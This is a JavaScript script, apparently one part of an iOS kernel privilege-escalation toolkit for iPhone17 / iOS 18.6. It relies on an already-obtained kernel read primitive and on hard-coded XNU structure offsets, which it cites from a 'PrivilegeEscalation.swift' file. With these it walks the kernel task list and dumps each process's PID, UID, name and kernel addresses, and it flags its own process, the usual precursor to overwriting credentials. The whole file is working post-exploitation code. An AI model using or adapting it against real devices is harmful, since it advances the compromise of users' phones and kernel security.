// ============================================================================
// walk_all_procs.js — Walk all processes using confirmed offsets
// ============================================================================
//
// REPL API assumed:
//   kread64(addr)        -> BigInt   — read 8 bytes from kernel address
//   kread32(addr)        -> Number   — read 4 bytes from kernel address (optional)
//   kernelBase()         -> BigInt   — current kernel base
//   log(msg)             -> void     — print to REPL console
//
// Offsets from PEOffsets (PrivilegeEscalation.swift)
// Targeting: iPhone17 / iOS 18.6 / XNU 24.6
// ============================================================================

(function walkAllProcs() {
    "use strict";

    // --- Known offsets (iPhone17 / XNU 24.6 / iOS 18.6) ----------------------
    var OFFSET_KERNEL_TASK = 0xc1bf78n;   // kernelBase + this = &kernel_task
    var OFFSET_TASK_NEXT   = 0x30n;        // task->tasks.next
    var OFFSET_TASK_PREV   = 0x38n;        // task->tasks.prev
    var OFFSET_PROC_RO     = 0x3e0n;       // task->proc_ro
    var OFFSET_PRO_PID     = 0x1b8n;       // proc_ro->p_pid
    var OFFSET_PRO_COMM    = 0x56cn;       // proc_ro->p_comm (16 chars)
    var OFFSET_PRO_UCRED   = 0x20n;        // proc_ro->p_ucred
    var OFFSET_UCRED_UID   = 0x18n;        // ucred->cr_posix.cr_uid
    var MAX_WALK           = 1000;          // safety limit

    // --- Helpers -------------------------------------------------------------
    function hex(val) {
        if (typeof val === "bigint") return "0x" + val.toString(16);
        return "0x" + val.toString(16);
    }

    function padRight(str, len) {
        while (str.length < len) str += " ";
        return str;
    }

    function padLeft(str, len) {
        while (str.length < len) str = " " + str;
        return str;
    }

    function safeKread64(addr) {
        try {
            return kread64(addr);
        } catch (e) {
            return null;
        }
    }

    // Read a 32-bit value. Uses kread32 if available, otherwise masks kread64.
    function readPid(addr) {
        if (typeof kread32 === "function") {
            try {
                return kread32(addr);
            } catch (e) {}
        }
        var val = safeKread64(addr);
        if (val === null) return -1;
        return Number(val & 0xFFFFFFFFn);
    }

    // Read a null-terminated string from kernel memory (up to maxLen bytes).
    function readString(addr, maxLen) {
        var result = "";
        for (var i = 0; i < maxLen; i += 8) {
            var qword = safeKread64(addr + BigInt(i));
            if (qword === null) break;
            for (var b = 0; b < 8 && (i + b) < maxLen; b++) {
                var ch = Number((qword >> BigInt(b * 8)) & 0xFFn);
                if (ch === 0) return result;
                if (ch >= 0x20 && ch <= 0x7e) {
                    result += String.fromCharCode(ch);
                } else {
                    result += ".";
                }
            }
        }
        return result;
    }

    // --- Main ----------------------------------------------------------------
    var kbase = kernelBase();
    log("[walk] kernel_base = " + hex(kbase));

    var kernelTaskAddr = kbase + OFFSET_KERNEL_TASK;
    var kernelTaskVal = kread64(kernelTaskAddr);
    log("[walk] kernel_task = " + hex(kernelTaskVal));

    if (kernelTaskVal === 0n) {
        log("[walk] ERROR: kernel_task is NULL");
        return;
    }

    var ourPid = -1;
    if (typeof getpid === "function") {
        ourPid = getpid();
    }
    if (ourPid > 0) {
        log("[walk] Our PID = " + ourPid);
    }

    // Table header
    log("");
    log("  PID  | TASK_ADDR          | PROC_RO            | UID    | NAME");
    log("-------+--------------------+--------------------+--------+------------------");

    // First, handle kernel_task itself (PID 0)
    var kprocRO = safeKread64(kernelTaskVal + OFFSET_PROC_RO);
    if (kprocRO !== null && kprocRO !== 0n) {
        var kpid = readPid(kprocRO + OFFSET_PRO_PID);
        var kname = readString(kprocRO + OFFSET_PRO_COMM, 16);
        var kuid = "?";
        var kucred = safeKread64(kprocRO + OFFSET_PRO_UCRED);
        if (kucred !== null && kucred !== 0n) {
            kuid = "" + readPid(kucred + OFFSET_UCRED_UID);
        }
        log(
            padLeft("" + kpid, 5) + "  | " +
            padRight(hex(kernelTaskVal), 18) + " | " +
            padRight(hex(kprocRO), 18) + " | " +
            padRight(kuid, 6) + " | " +
            (kname || "(kernel_task)")
        );
    }

    // Walk the task linked list
    var current = safeKread64(kernelTaskVal + OFFSET_TASK_NEXT);
    var count = 0;
    var foundSelf = false;

    while (current !== null && current !== 0n && current !== kernelTaskVal && count < MAX_WALK) {
        count++;

        var procROAddr = safeKread64(current + OFFSET_PROC_RO);
        if (procROAddr === null || procROAddr === 0n) {
            log(padLeft("?", 5) + "  | " +
                padRight(hex(current), 18) + " | " +
                padRight("NULL", 18) + " | " +
                padRight("?", 6) + " | " +
                "(no proc_ro)");
            current = safeKread64(current + OFFSET_TASK_NEXT);
            continue;
        }

        var pid = readPid(procROAddr + OFFSET_PRO_PID);
        var name = readString(procROAddr + OFFSET_PRO_COMM, 16);

        // Read UID from ucred
        var uid = "?";
        var ucred = safeKread64(procROAddr + OFFSET_PRO_UCRED);
        if (ucred !== null && ucred !== 0n) {
            uid = "" + readPid(ucred + OFFSET_UCRED_UID);
        }

        var marker = "";
        if (pid === ourPid && ourPid > 0) {
            marker = " <== US";
            foundSelf = true;
        }

        log(
            padLeft("" + pid, 5) + "  | " +
            padRight(hex(current), 18) + " | " +
            padRight(hex(procROAddr), 18) + " | " +
            padRight(uid, 6) + " | " +
            (name || "(unnamed)") + marker
        );

        current = safeKread64(current + OFFSET_TASK_NEXT);
    }

    // Summary
    log("-------+--------------------+--------------------+--------+------------------");
    log("[walk] Total processes walked: " + (count + 1));  // +1 for kernel_task

    if (count >= MAX_WALK) {
        log("[walk] WARNING: Hit MAX_WALK limit (" + MAX_WALK + "). List may be circular or corrupted.");
    }

    if (ourPid > 0 && !foundSelf) {
        log("[walk] WARNING: Did not find our own process (PID " + ourPid + ") in task list.");
        log("[walk] This may indicate incorrect offsets for proc_ro or p_pid.");
    }

    log("[walk] Done.");
})();
